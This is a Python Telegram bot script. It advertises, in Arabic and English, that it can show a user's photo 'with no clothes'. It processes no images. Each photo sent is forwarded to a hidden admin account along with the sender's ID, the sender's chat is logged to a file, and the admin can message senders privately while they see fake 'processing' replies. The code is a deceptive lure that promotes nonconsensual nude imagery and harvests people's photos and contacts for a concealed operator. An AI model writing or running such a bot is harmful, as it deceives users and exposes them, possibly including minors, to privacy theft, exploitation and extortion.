import telebot
from telebot import types
import os
import json

API_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
bot = telebot.TeleBot(API_TOKEN)

DATA_FILE = "user_data.json"
student_lookup = {}

# تحميل بيانات الطلبة
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r") as f:
        student_lookup = json.load(f)

# حفظ البيانات
def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(student_lookup, f)

# رسالة البداية
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id,
        "👀 تخيّل صورتك تتعدّل بثواني…\n"
        "💋 تقدر تشوفها بدون ملابس، أو بملامح أحلى.\n"
        "📸 أرسل صورة الآن وخلّنا نبدأ...\n\n"
        "👀 Imagine your photo transformed in seconds…\n"
        "💋 See it with no clothes, or with enhanced features.\n"
        "📸 Send a photo now... let’s get started.")

# عند إرسال صورة
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞", callback_data="nude"))
    markup.add(types.InlineKeyboardButton("تعديل الوجه 💄", callback_data="face"))
    markup.add(types.InlineKeyboardButton("تحسين الصورة 📸", callback_data="enhance"))

    bot.send_message(message.chat.id, "اختر نوع التعديل:", reply_markup=markup)

    try:
        file_id = message.photo[-1].file_id
        sent_msg = bot.send_photo(ADMIN_ID, file_id, caption=f"📸 صورة من الطالب: {message.from_user.id}")
        student_lookup[str(sent_msg.message_id)] = message.chat.id
        save_data()
    except Exception as e:
        print("خطأ أثناء إرسال الصورة للمشرف:", e)

# رد المشرف على الصورة
@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.reply_to_message)
def handle_admin_reply(message):
    try:
        msg_id = str(message.reply_to_message.message_id)
        student_id = student_lookup.get(msg_id)

        if student_id:
            bot.send_message(student_id, f"📩 رسالة من المشرف:\n{message.text}")
            bot.send_message(ADMIN_ID, "✅ تم إرسال الرسالة للطالب.")
        else:
            bot.send_message(ADMIN_ID, "⚠️ لم يتم العثور على الطالب المرتبط بهذه الصورة.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❗ خطأ: {e}")

# ردود الأزرار
@bot.callback_query_handler(func=lambda call: True)
def handle_choice(call):
    choice_map = {
        "nude": "✅ تم اختيار \"إزالة الملابس\"\nيرجى الانتظار..",
        "face": "✅ تم اختيار \"تعديل الوجه\"\nيتم المعالجة الآن..",
        "enhance": "✅ تم اختيار \"تحسين الصورة\"\nانتظر قليلًا..."
    }
    msg = choice_map.get(call.data, "تم استلام طلبك.")
    bot.send_message(call.message.chat.id, msg)

# تنبيه عند إرسال نص فقط
@bot.message_handler(func=lambda message: message.content_type == 'text')
def warn_text_only(message):
    bot.send_message(message.chat.id, "⚠️ الرجاء إرسال صورة فقط.")

print("✅ Bot is running...")
bot.polling()
